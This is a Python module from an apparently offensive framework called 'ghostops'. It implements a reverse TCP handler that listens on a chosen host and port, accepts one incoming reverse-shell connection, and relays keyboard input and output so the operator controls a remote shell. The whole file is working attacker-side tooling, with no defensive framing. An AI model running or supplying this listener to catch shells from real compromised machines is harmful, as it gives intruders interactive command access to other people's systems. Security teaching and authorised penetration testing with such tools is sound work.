import socket
import select
import sys
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger


class ReverseTcpHandler(BaseModule):
    """
    Reverse TCP Handler Module

    Listens for an incoming reverse TCP connection and provides
    a fully interactive shell interface.
    """

    module_name = "ReverseTcpHandler"
    module_description = "Listens for incoming reverse TCP connection and provides a fully interactive shell."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "handler"
    module_target_os = ["generic"]
    module_target_architecture = ["generic"]

    @staticmethod
    def add_arguments(parser):
        """
        Define command-line arguments for the handler.

        :param parser: ArgumentParser instance to add arguments to
        """
        parser.add_argument(
            "--host",
            required=True,
            help="IP address to listen on for incoming reverse TCP shell",
        )
        parser.add_argument(
            "--port",
            required=True,
            type=int,
            help="Port to listen on for incoming reverse TCP shell",
        )

    @staticmethod
    def interactive_shell(conn):
        """
        Interactive shell that handles bidirectional communication
        between local user and remote reverse TCP shell.

        :param conn: Accepted socket connection from reverse shell client
        """
        conn.setblocking(False)  # Set socket to non-blocking mode

        try:
            while True:
                # Wait for either socket data or user input
                ready_to_read, _, _ = select.select([conn, sys.stdin], [], [])

                for source in ready_to_read:
                    if source == conn:
                        # Data received from remote shell
                        data = conn.recv(4096)
                        if not data:
                            Logger.log("warn", "Connection closed by remote host.")
                            return
                        # Decode and print data to stdout
                        sys.stdout.write(data.decode(errors="ignore"))
                        sys.stdout.flush()

                    else:
                        # User input from stdin
                        user_input = sys.stdin.readline()
                        if not user_input:
                            # EOF (Ctrl+D) received, exit shell
                            Logger.log(
                                "info", "EOF received from stdin. Closing shell."
                            )
                            return
                        # Send user input to remote shell
                        conn.sendall(user_input.encode())

        except KeyboardInterrupt:
            print(end="\r")
            Logger.log("warn", f"KeyboardInterrupt received from stdin. Closing shell.")
        except Exception as e:
            Logger.log("warn", f"Error in interactive shell: {e}")

    @staticmethod
    def main(args):
        """
        Main method to start listening for a reverse TCP shell connection.

        :param args: Parsed command-line arguments with host and port
        """
        host = args.host
        port = args.port

        Logger.log("info", f"Listening on {host}:{port}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((host, port))
            server.listen(1)

            # Accept a single incoming connection
            conn, addr = server.accept()
            with conn:
                Logger.log("good", f"Connection established from {addr[0]}:{addr[1]}")
                ReverseTcpHandler.interactive_shell(conn)
